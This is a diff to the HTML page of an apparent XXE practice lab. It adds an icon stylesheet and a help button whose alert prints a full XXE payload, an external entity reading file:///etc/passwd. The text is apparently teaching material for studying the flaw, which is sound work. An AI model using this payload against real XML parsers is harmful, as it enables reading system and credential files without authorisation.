@@ -2,6 +2,7 @@
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
         <link href="./css/result.css" rel="stylesheet">
+        <link href="../fontawesome/web-fonts-with-css/css/fontawesome-all.min.css" rel="stylesheet">
         <title>XXE(有回显)</title>
     </head>
     <body>
@@ -11,5 +12,15 @@
             <textarea name='xml'></textarea>
             <input type="submit" value="解析" name="submit">
         </form>
+        <button onclick="help()" style="background-color:transparent;border:none;">
+            <i class='far fa-question-circle' style='font-size:15px;color:green;'></i><span style='color:green;'>帮助</span>
+        </button>
+        <script>
+
+            function help(){
+                alert("绕过方法:<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><bug><xxe>&xxe;</xxe></bug>");
+            }
+                
+        </script>
     </body>
 </html>
